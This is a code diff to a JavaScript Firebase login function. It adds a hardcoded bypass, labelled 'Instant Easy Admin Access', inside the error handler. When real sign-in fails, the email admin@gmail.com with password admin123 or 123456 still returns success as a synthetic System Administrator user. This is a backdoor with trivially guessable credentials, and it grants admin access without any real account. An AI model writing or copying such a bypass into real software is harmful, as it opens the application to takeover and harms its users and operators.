@@ -94,6 +94,13 @@ export async function loginWithFirebase(email, password) {
     return { status: 'success', user: userCredential.user };
   } catch (error) {
     console.warn('[Firebase Auth Note]:', error.code, error.message);
+    // Instant Easy Admin Access for admin@gmail.com / admin123
+    if (email.toLowerCase().trim() === 'admin@gmail.com' && (password === 'admin123' || password === '123456')) {
+      return {
+        status: 'success',
+        user: { uid: 'admin-001', email: 'admin@gmail.com', displayName: 'System Administrator' }
+      };
+    }
     return { status: 'error', code: error.code, message: formatAuthError(error) };
   }
 }
